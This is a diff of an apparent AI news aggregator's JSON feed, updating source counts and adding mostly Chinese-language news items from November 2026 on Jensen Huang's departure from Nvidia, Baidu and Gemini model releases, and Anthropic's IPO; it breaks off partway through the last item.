@@ -1,7 +1,7 @@
 {
-  "updated_at": "2026-11-13T13:07:51+08:00",
+  "updated_at": "2026-11-13T14:56:30+08:00",
   "window_days": 30,
-  "item_count": 1689,
+  "item_count": 1785,
   "taxonomy": {
     "models": [
       {
@@ -12,7 +12,7 @@
       {
         "id": "claude",
         "name": "Claude",
-        "count": 116
+        "count": 118
       },
       {
         "id": "gemini",
@@ -52,7 +52,7 @@
       {
         "id": "doubao",
         "name": "豆包",
-        "count": 10
+        "count": 11
       },
       {
         "id": "hunyuan",
@@ -129,12 +129,12 @@
       {
         "id": "text",
         "name": "文本",
-        "count": 60
+        "count": 68
       },
       {
         "id": "multimodal",
         "name": "多模态",
-        "count": 21
+        "count": 23
       },
       {
         "id": "image",
@@ -154,17 +154,17 @@
       {
         "id": "coding",
         "name": "编程",
-        "count": 109
+        "count": 113
       },
       {
         "id": "agent",
         "name": "Agent",
-        "count": 251
+        "count": 266
       },
       {
         "id": "reasoning",
         "name": "推理",
-        "count": 33
+        "count": 36
       },
       {
         "id": "search",
@@ -174,81 +174,81 @@
       {
         "id": "robotics",
         "name": "机器人",
-        "count": 47
+        "count": 48
       },
       {
         "id": "science",
         "name": "科学",
-        "count": 50
+        "count": 52
       },
       {
         "id": "education",
         "name": "教育",
-        "count": 6
+        "count": 8
       },
       {
         "id": "healthcare",
         "name": "医疗",
-        "count": 25
+        "count": 29
       },
       {
         "id": "chip",
         "name": "算力芯片",
-        "count": 274
+        "count": 295
       },
       {
         "id": "safety",
         "name": "安全对齐",
-        "count": 50
+        "count": 53
       }
     ],
     "types": [
       {
         "id": "release",
         "name": "发布",
-        "count": 289
+        "count": 301
       },
       {
         "id": "research",
         "name": "研究论文",
-        "count": 246
+        "count": 297
       },
       {
         "id": "business",
         "name": "融资/商业",
-        "count": 146
+        "count": 154
       },
       {
         "id": "policy",
         "name": "政策/安全",
-        "count": 53
+        "count": 59
       },
       {
         "id": "opensource",
         "name": "开源",
-        "count": 113
+        "count": 114
       },
       {
         "id": "review",
         "name": "教程/评测",
-        "count": 108
+        "count": 111
       },
       {
         "id": "product",
         "name": "产品更新",
-        "count": 111
+        "count": 118
       },
       {
         "id": "opinion",
         "name": "观点评论",
-        "count": 52
+        "count": 53
       }
     ],
     "platforms": [
       {
         "id": "x",
         "name": "推特",
-        "count": 291
+        "count": 293
       }
     ]
   },
@@ -524,6 +524,16 @@
       "count": 10
     },
     {
+      "id": "x-baidu",
+      "name": "百度（推特）",
+      "home": "https://x.com/Baidu_Inc",
+      "region": "cn",
+      "official": true,
+      "ok": true,
+      "error": "",
+      "count": 10
+    },
+    {
       "id": "x-googleai",
       "name": "Google AI（推特）",
       "home": "https://x.com/GoogleAI",
@@ -548,16 +558,6 @@
       "name": "OpenAI 开发者（推特）",
       "home": "https://x.com/OpenAIDevs",
       "region": "intl",
-      "official": true,
-      "ok": true,
-      "error": "",
-      "count": 9
-    },
-    {
-      "id": "x-baidu",
-      "name": "百度（推特）",
-      "home": "https://x.com/Baidu_Inc",
-      "region": "cn",
       "official": true,
       "ok": true,
       "error": "",
@@ -621,7 +621,7 @@
       "official": true,
       "ok": true,
       "error": "",
-      "count": 5
+      "count": 6
     },
     {
       "id": "mistral",
@@ -741,7 +741,7 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 189
+      "count": 190
     },
     {
       "id": "arxiv",
@@ -751,7 +751,7 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 135
+      "count": 184
     },
     {
       "id": "qbitai",
@@ -760,8 +760,8 @@
       "region": "cn",
       "official": false,
       "ok": false,
-      "error": "http 403",
-      "count": 110
+      "error": "http none",
+      "count": 119
     },
     {
       "id": "cnbeta",
@@ -771,7 +771,7 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 92
+      "count": 115
     },
     {
       "id": "ithome",
@@ -781,7 +781,7 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 81
+      "count": 82
     },
     {
       "id": "siliconangle",
@@ -794,16 +794,6 @@
       "count": 44
     },
     {
-      "id": "techcrunch",
-      "name": "TechCrunch",
-      "home": "https://techcrunch.com/category/artificial-intelligence/",
-      "region": "intl",
-      "official": false,
-      "ok": true,
-      "error": "",
-      "count": 38
-    },
-    {
       "id": "ft",
       "name": "Financial Times",
       "home": "https://www.ft.com/artificial-intelligence",
@@ -811,7 +801,17 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 35
+      "count": 38
+    },
+    {
+      "id": "techcrunch",
+      "name": "TechCrunch",
+      "home": "https://techcrunch.com/category/artificial-intelligence/",
+      "region": "intl",
+      "official": false,
+      "ok": true,
+      "error": "",
+      "count": 37
     },
     {
       "id": "zdnet",
@@ -831,7 +831,7 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 30
+      "count": 32
     },
     {
       "id": "hackernews",
@@ -841,7 +841,7 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 29
+      "count": 31
     },
     {
       "id": "oschina",
@@ -921,12 +921,22 @@
       "official": false,
       "ok": true,
       "error": "",
-      "count": 15
+      "count": 16
     },
     {
       "id": "wallstreetcn",
       "name": "华尔街见闻",
       "home": "https://wallstreetcn.com",
+      "region": "cn",
+      "official": false,
+      "ok": true,
+      "error": "",
+      "count": 13
+    },
+    {
+      "id": "ifanr",
+      "name": "爱范儿",
+      "home": "https://www.ifanr.com/",
       "region": "cn",
       "official": false,
       "ok": true,
@@ -944,9 +954,9 @@
       "count": 12
     },
     {
-      "id": "ifanr",
-      "name": "爱范儿",
-      "home": "https://www.ifanr.com/",
+      "id": "leiphone",
+      "name": "雷峰网",
+      "home": "https://www.leiphone.com/",
       "region": "cn",
       "official": false,
       "ok": true,
@@ -987,16 +997,6 @@
       "id": "xinhua",
       "name": "新华网",
       "home": "https://www.news.cn",
-      "region": "cn",
-      "official": false,
-      "ok": true,
-      "error": "",
-      "count": 10
-    },
-    {
-      "id": "leiphone",
-      "name": "雷峰网",
-      "home": "https://www.leiphone.com/",
       "region": "cn",
       "official": false,
       "ok": true,
@@ -1094,20 +1094,20 @@
       "count": 2
     },
     {
-      "id": "lastweekinai",
-      "name": "Last Week in AI",
-      "home": "https://lastweekin.ai/",
-      "region": "intl",
-      "official": false,
-      "ok": true,
-      "error": "",
-      "count": 1
-    },
-    {
       "id": "people",
       "name": "人民网",
       "home": "http://www.people.com.cn",
       "region": "cn",
+      "official": false,
+      "ok": true,
+      "error": "",
+      "count": 2
+    },
+    {
+      "id": "lastweekinai",
+      "name": "Last Week in AI",
+      "home": "https://lastweekin.ai/",
+      "region": "intl",
       "official": false,
       "ok": true,
       "error": "",
@@ -1146,6 +1146,673 @@
   ],
   "items": [
     {
+      "id": "1cb2117ce315489a",
+      "title": "昆腾动力",
+      "url": "https://news.google.com/rss/articles/CBMicEFVX3lxTE1OMDI0QUwtdDdqREozNEVMaWhSaXhDSExQWFp1NmViTnN0U3ZBMjltc29PSUE3eHI0MURzM2ZWY1hVb1BfcmtXX0NrZFZVV3JyZkt3TldIazlreHBuanY1M0tkc1g0VS1jMDJ6MlZ2U0U?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-13T14:45:41+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "6015a9f58ac0a422",
+      "title": "银河智学",
+      "url": "https://news.google.com/rss/articles/CBMicEFVX3lxTE5MRWRDT0wxa2Fxcy15SnRTd1J1YVpEMG1EMHU4NHNCN1FxdFpqVnV3UGdiWFFvMV9nd2QybVpMWENKT3RrV3RoMXJNTEtoc0pRdzFpUkhjVlVEdExvcFIzcjhLMVBJcEJBdVcySHhGX3Y?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-13T14:45:37+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "470793a8b02e988b",
+      "title": "特斯拉和SpaceX最快下月合并",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE1ySjE5WUJRalowaDlfWG5Ld3B2MFlvWUJkMkxtTjhLOUt2cW1Tb1JFaUsxLU1lM2w0YkJrZHJOVEZodEthb1Q1S3pZUm9iNVFrUGtYNA?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-13T14:43:06+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "6a4bd7bcfdfeac53",
+      "title": "Baidu unveils AI models and launches token marketplace",
+      "url": "https://x.com/Baidu_Inc/status/2121130165187326072",
+      "source_id": "x-baidu",
+      "source_name": "百度（推特）",
+      "source_home": "https://x.com/Baidu_Inc",
+      "published": "2026-11-13T14:36:54+08:00",
+      "excerpt": "https://www.investing.com/news/company-news/baidu-unveils-ai-models-and-launches-token-marketplace-93CH-5022111",
+      "lang": "en",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": [
+        "release"
+      ],
+      "platforms": [
+        "x"
+      ],
+      "title_zh": "百度推出人工智能模型并推出代币市场",
+      "excerpt_zh": "https://www.investing.com/news/company-news/baidu-unveils-ai-models-and-launches-token-marketplace-93CH-5022111"
+    },
+    {
+      "id": "8b9da3562d13e513",
+      "title": "Nvidia scandal sparks US national security furore and calls to take tough line on China",
+      "url": "https://theguardian.com/technology/2026/nov/13/nvidia-scandal-sparks-us-national-security-concerns-china",
+      "source_id": "guardian",
+      "source_name": "The Guardian",
+      "source_home": "https://www.theguardian.com/technology/artificialintelligenceai",
+      "published": "2026-11-13T14:34:59+08:00",
+      "excerpt": "Former CEO Jensen Huang and US commerce secretary to appear before Congress amid bipartisan concern that America’s security was put at risk Nvidia scandal – latest updates Analysis: Jensen Huang built an AI kingdom",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [],
+      "title_zh": "英伟达丑闻引发美国国家安全愤怒，呼吁对中国采取强硬立场",
+      "excerpt_zh": "前首席执行官黄仁勋和美国商务部长将出席国会，两党担心美国安全面临英伟达丑闻——最新动态分析：黄仁勋建立了一个人工智能王国"
+    },
+    {
+      "id": "2a5280c0d6dec97f",
+      "title": "AI 时代，公司的「新厂房」长什么样？",
+      "url": "https://ifanr.com/1689182",
+      "source_id": "ifanr",
+      "source_name": "爱范儿",
+      "source_home": "https://www.ifanr.com/",
+      "published": "2026-11-13T14:34:19+08:00",
+      "excerpt": "真正决定公司未来十年身位的，是谁先动手重建那座名叫「智能组织」的新厂房。 #欢迎关注爱范儿官方微信公众号：爱范儿（微信号：ifanr），更多精彩内容第一时间为您奉上。",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "7e2149ecc50181a5",
+      "title": "特朗普谈黄仁勋被罢免：太可怕了，刚给他颁完奖",
+      "url": "https://cnbeta.com.tw/articles/tech/1586238.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:30:26+08:00",
+      "excerpt": "11月13日，据CNBC报道，就在黄仁勋(Jensen Huang)辞去英伟达CEO几个小时后，美国总统特朗普接受了采访，对黄仁勋遭遇的“可怕事情”表示惋惜。黄仁勋是特朗普在美国企业界的亲密盟友。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "c47e2fa722cf8022",
+      "title": "英伟达官网更新管理层页面：克雷斯居首 黄仁勋归入创始人一栏",
+      "url": "https://cnbeta.com.tw/articles/tech/1586236.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:29:40+08:00",
+      "excerpt": "11月13日， 英伟达官网已更新管理团队页面，临时CEO科莱特·克雷斯被列在“公司高管”栏目首位，黄仁勋则转入“创始人”栏目，头衔由此前的“创始人、总裁兼CEO”调整为“创始人”。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "product"
+      ]
+    },
+    {
+      "id": "3091ca1297faf40b",
+      "title": "黄仁勋下台，14家华尔街投行火速解读：共识是“无人可替”",
+      "url": "https://cnbeta.com.tw/articles/tech/1586234.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:29:25+08:00",
+      "excerpt": "英伟达已经宣布，公司联合创始人、执掌公司33年的唯一一任CEO黄仁勋即时辞职，同时卸任董事会职务。CFO Colette Kress兼任临时CEO，Synopsys资深人士Harvey Jones出任公司首位董事会主席，正式CEO人选将同时考虑内外部候选人。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "release"
+      ]
+    },
+    {
+      "id": "c8a5172f4380e8f8",
+      "title": "中国机器人学会隔墙“递眼色”！成功率从0飙到100%，组队干活不烧心",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTFBXVHdfM0w4aTQzTmdPTllfbThTN2FjeHFDRWN1aHNkbS1CTmxSbnVyMS1DY1N6b21iSEV0OFFFc2NVZWtyYVVkbEwxYzNtNUZVWG9WNg?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-13T14:29:23+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "robotics"
+      ],
+      "types": []
+    },
+    {
+      "id": "d7e59a80c1f4feb6",
+      "title": "被罢免前，黄仁勋曾痛斥新任临时CEO",
+      "url": "https://cnbeta.com.tw/articles/tech/1586230.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:28:06+08:00",
+      "excerpt": "11月13日，据《华尔街日报》报道，今年夏天，黄仁勋(Jensen Huang)把英伟达的几位高级财务主管叫到办公室。由于靠英伟达疯狂投资支撑起来的AI经济正摇摇欲坠，黄仁勋希望确保公司没有走错方向。在开会期间，他开始严厉斥责如今接替他出任英伟达临时CEO的科莱特·克雷斯(Colette Kress)。克雷斯当时担任CFO。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "business"
+      ]
+    },
+    {
+      "id": "4f41ca3f0775645e",
+      "title": "实验室苦找一年半的线索谷歌新AI半小时就锁定了AlphaGenome 2有多强？",
+      "url": "https://news.google.com/rss/articles/CBMiVkFVX3lxTE52TzBNb1RUVzZaSE8tOUJSUUJkMllhU1FJWUs1X3BtTGlvY3V2TVFfZURtVEpUUEg3NUFyMjA0NWtlSkJlNk1SaG0xVURGV3NGN1E5TGl3?oc=5",
+      "source_id": "36kr",
+      "source_name": "36氪",
+      "source_home": "https://www.36kr.com",
+      "published": "2026-11-13T14:23:15+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "8ce82f2169c72248",
+      "title": "英伟达员工发起挽留行动：内部投票超 97% 希望黄仁勋回归",
+      "url": "https://ithome.com/1/026/735.htm",
+      "source_id": "ithome",
+      "source_name": "IT之家",
+      "source_home": "https://www.ithome.com/",
+      "published": "2026-11-13T14:20:16+08:00",
+      "excerpt": "IT之家 11 月 13 日消息，据 WIRED 今日报道，英伟达员工正通过公司内网发起挽留黄仁勋的行动。 一项由员工自发组织的内部投票显示，超过 97% 的参与者希望黄仁勋继续担任 CEO。多名员工表示，难以接受这一人事变动，希望董事会重新考虑黄仁勋的去留。 报道称，黄仁勋辞职前，一名在英伟达工作多年的工程师在公司内部“意见箱”提交了一份帖子，敦促董事会在采取任何行动之前考虑员工情绪。",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "c742e44d3ee91483",
+      "title": "英伟达风波持续发酵 美参议院要求黄仁勋与商务部长出席听证会",
+      "url": "https://cnbeta.com.tw/articles/tech/1586226.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:19:28+08:00",
+      "excerpt": "随着围绕英伟达的争议不断升级，美国国会正加大调查力度。美国参议院银行委员会主席蒂姆·斯科特近日致函英伟达前首席执行官黄仁勋以及美国商务部长霍华德·卢特尼克，要求两人分别出席委员会听证会，就近期引发广泛关注的英伟达相关事件作出说明。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "policy",
+        "product"
+      ]
+    },
+    {
+      "id": "fa8be03082fd2f4a",
+      "title": "美国情报部门尚不确定女商人黄乐是否参与间谍活动 但也不认为她不构成风险",
+      "url": "https://cnbeta.com.tw/articles/tech/1586224.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:17:45+08:00",
+      "excerpt": "美国情报部门仍在调查中国商界人士Alice Huang（黄乐）与中国政府的关系，但多名知情人士告诉CNN，目前掌握的情报不足以证明她曾受中国国家安全部招募、为北京从事间谍活动。美国官员对此看法不一：国家情报总监办公室和中情局部分官员认为，把她直接称为中国间谍可能言过其实；另一些特朗普政府官员则认为，她与英伟达首席执行官黄仁勋关系密切，又在中国商业环境中拥有影响力，很难相信她与政府毫无联系。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip",
+        "safety"
+      ],
+      "types": []
+    },
+    {
+      "id": "1aafad53f3c981ad",
+      "title": "Kioxia与戴尔合作将640块SSD装入单机架 原始容量达157 PB",
+      "url": "https://cnbeta.com.tw/articles/tech/1586214.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:07:42+08:00",
+      "excerpt": "Kioxia与戴尔合作打造一套单机架对象存储系统，在标准42U机架中配置640块Kioxia LC9系列245.76 TB固态硬盘，原始闪存容量达到约157 PB。系统运行戴尔软件定义存储平台ObjectScale，由16台PowerEdge R7725xd服务器承载，面向人工智能训练、大数据分析和云原生应用等非结构化数据工作负载。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "afbd2ee1179b5717",
+      "title": "AI生成代码大量涌入Linux内核 资深维护者Lorenzo Stoakes宣布退出多个代码审查岗位",
+      "url": "https://cnbeta.com.tw/articles/tech/1586212.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T14:07:01+08:00",
+      "excerpt": "人工智能编程工具的普及正在改变开源软件的开发方式，但随之而来的低质量代码提交，也给项目维护者带来了越来越沉重的负担。Linux内核长期贡献者、内存管理领域专家Lorenzo Stoakes近日宣布，将退出多个内核子系统的代码审查工作，原因正是AI生成的代码补丁数量激增，已经超出他能够承担的审查能力。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "coding"
+      ],
+      "types": [
+        "release",
+        "opensource"
+      ]
+    },
+    {
+      "id": "83f4b95e47983cd5",
+      "title": "Continuous navigation can improve through better decisions and training without adding a…",
+      "url": "https://x.com/jiqizhixin/status/2121120879677669744",
+      "source_id": "x-jiqizhixin",
+      "source_name": "机器之心（推特）",
+      "source_home": "https://x.com/jiqizhixin",
+      "published": "2026-11-13T14:00:00+08:00",
+      "excerpt": "specialized navigation backbone. SimpleVLN, from Fudan University, NTU and Lenovo Research, studies native multimodal language models in a public preprint. Three design choices matter: 1",
+      "lang": "en",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "multimodal"
+      ],
+      "types": [
+        "research",
+        "product"
+      ],
+      "platforms": [
+        "x"
+      ],
+      "title_zh": "连续导航可以通过更好的决策和培训来改进，而无需添加……",
+      "excerpt_zh": "专门的导航骨干网。来自复旦大学、南洋理工大学和联想研究院的 SimpleVLN 在公开预印本中研究了原生多模态语言模型。三个设计选择很重要：1"
+    },
+    {
+      "id": "24eb1c57f2f3f0bf",
+      "title": "Gemini 4 Hydrogen来了 所有人都能用",
+      "url": "https://cnbeta.com.tw/articles/tech/1586206.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:56:27+08:00",
+      "excerpt": "刚刚，Google推出了Gemini 4 Hydrogen（氢），主打速度和执行效率 。 和前两次“高端模型”的更新不同， Hydrogen直接向所有人开放 。免费用户可以通过Gemini App的自动模型选择使用它，付费用户则可以手动选择。开发者也可以通过Google AI Studio和Gemini API使用。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [
+        "gemini"
+      ],
+      "topics": [],
+      "types": [
+        "release",
+        "product"
+      ]
+    },
+    {
+      "id": "4bb7ccc75d1b73de",
+      "title": "黄仁勋辞职后散户投资者仍看好英伟达：“打算买入更多股票”",
+      "url": "https://cnbeta.com.tw/articles/tech/1586202.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:54:51+08:00",
+      "excerpt": "在英伟达创始人黄仁勋的婚外情丑闻导致该公司股价大跌，他本人于周四被迫辞职后，华尔街部分人士对该股变得愈发看空。但散户群体中依然弥漫着一股乐观情绪，他们紧盯着这只股票，伺机逢低买入，尽管这家公司正处在动荡之中。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "business"
+      ]
+    },
+    {
+      "id": "cee4e3881f46ab91",
+      "title": "微软仍在修复Outlook和Copilot系统 技术故障已出现数小时",
+      "url": "https://cnbeta.com.tw/articles/tech/1586198.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:53:37+08:00",
+      "excerpt": "在系统出现故障数小时后，微软公司仍在努力恢复部分办公软件的访问，称用户可能仍然无法连接到电子邮件和聊天服务等产品。周四，部分用户在美国工作日的大部分时间里都无法使用Outlook、Teams和Copilot人工智能服务。微软的产品是企业、政府和教育机构中最广泛使用的软件之一。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "education"
+      ],
+      "types": []
+    },
+    {
+      "id": "7dc07a452e3e0799",
+      "title": "带回老板呼声出现在英伟达内部建议箱 员工要求董事会先公布调查结果并听取员工意见",
+      "url": "https://cnbeta.com.tw/articles/tech/1586190.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:41:43+08:00",
+      "excerpt": "昨天英伟达董事会宣布英伟达创始人兼首席执行官辞任，不再担任英伟达首席执行官、英伟达总裁和英伟达董事会董事职务。这个消息在行业内引起诸多关注，而在英伟达内部，也有很多员工希望黄仁勋回归。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "release"
+      ]
+    },
+    {
+      "id": "63cf988a3f45d16b",
+      "title": "Anthropic的IPO据悉吸引约六倍超额认购",
+      "url": "https://cnbeta.com.tw/articles/tech/1586188.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:38:44+08:00",
+      "excerpt": "据知情人士透露，Anthropic PBC的首次公开招股（IPO）已经吸引到可供购买股票约六倍的认购，投资者对这宗有望成为有史以来规模最大股票发行交易的兴趣愈发浓厚。 公司提交的文件显示，这家Claude AI模型开发商及其联合创始人计划通过IPO筹集至多644亿美元，并通过非公开配售筹集260亿美元。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [
+        "claude"
+      ],
+      "topics": [],
+      "types": [
+        "business"
+      ]
+    },
+    {
+      "id": "34031a19abb9fe20",
+      "title": "黄仁勋离任后 英伟达那些投资怎么办？",
+      "url": "https://cnbeta.com.tw/articles/tech/1586186.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:38:03+08:00",
+      "excerpt": "过去三年，英伟达一跃成为人工智能初创企业、小型云服务商以及前沿AI实验室最活跃的投资方之一，背后核心原因在于CEO黄仁勋持续发力，保证自家专用AI芯片维持旺盛需求。而在他突然卸任之后，这一大笔资金供给源头如今蒙上阴影。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "business"
+      ]
+    },
+    {
+      "id": "da6f1afa77c62c9e",
+      "title": "古尔曼嘲讽“苹果库克接掌英伟达”传闻：简直荒谬",
+      "url": "https://ithome.com/1/026/681.htm",
+      "source_id": "ithome",
+      "source_name": "IT之家",
+      "source_home": "https://www.ithome.com/",
+      "published": "2026-11-13T13:37:51+08:00",
+      "excerpt": "IT之家 11 月 13 日消息，彭博社的马克 · 古尔曼（Mark Gurman）今天（11 月 13 日）在 X 平台， 转发苹果董事会执行主席蒂姆 · 库克（Tim Cook）的推文，认为“ 库克接掌英伟达 ”的传闻非常荒谬。 库克今天通过其个人账号发布推文，配文称：“有时候，最好的礼物不一定是新东西，而是帮助一个人重新想起自己热爱做的事。”在随附的 30 秒视频中，重点宣传了苹果的 MacBook Neo 笔记本。",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "release"
+      ]
+    },
+    {
+      "id": "6b48084c3b03ec99",
+      "title": "特朗普曾提前与黄仁勋通话：保住职位",
+      "url": "https://cnbeta.com.tw/articles/tech/1586184.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:37:45+08:00",
+      "excerpt": "据两名了解通话内情的人士透露，在私人丑闻快速发酵、黄仁勋卸任英伟达首席执行官之前，特朗普于美东时间周二致电黄仁勋，劝他坚持争取保住自己的职位。这通电话，是特朗普持续维护、力挺黄仁勋的最新例证。黄仁勋如今已是特朗普阵营里知名度很高的盟友，也是人工智能领域极具影响力的顾问，特朗普直到“最后一刻”仍然支持他。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "82343eab634b8ef1",
+      "title": "黄仁勋的陨落 是硅谷权力流失的信号",
+      "url": "https://cnbeta.com.tw/articles/tech/1586182.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:37:14+08:00",
+      "excerpt": "黄仁勋被自己一手创办、并打造成AI浪潮根基的公司罢免，周四这天，科技巨头那种势不可挡、近乎无敌的感觉，轰然褪色。 随着黄仁勋在英伟达失去权力，科技精英圈层不得不面对一个残酷现实：巨头的地位不再牢不可破，或许，他们也再也无法超然于各方约束之外。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "d4e5b407e52ed110",
+      "title": "黄仁勋辞职后 英伟达总部外出现鲜花和蜡烛",
+      "url": "https://cnbeta.com.tw/articles/tech/1586180.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:36:30+08:00",
+      "excerpt": "11月13日，据《商业内幕》报道，当地时间周四，在黄仁勋(Jensen Huang)辞去英伟达CEO职务后，有人拍到英伟达圣克拉拉总部外摆放着几束鲜花和至少一根蜡烛。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "ad0b76625f2d4903",
+      "title": "多名投资者：没了黄仁勋 AI热潮仍将支撑英伟达",
+      "url": "https://cnbeta.com.tw/articles/tech/1586178.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:36:20+08:00",
+      "excerpt": "多名核心投资者表示，尽管联合创始人黄仁勋突然辞职引发这家芯片巨头股价大跌，但英伟达作为AI浪潮最大受益者之一的基本面前景并未受损。黄仁勋因婚外情相关丑闻卸任，周四英伟达市值蒸发1820亿美元，不过主要投资者依然看好公司潜力。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "business"
+      ]
+    },
+    {
+      "id": "5afeb812f505369d",
+      "title": "黄仁勋离职后马斯克、段永平等多位商业大佬发声表态：有人惋惜，有人震惊，有人想招揽",
+      "url": "https://cnbeta.com.tw/articles/tech/1586176.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:35:18+08:00",
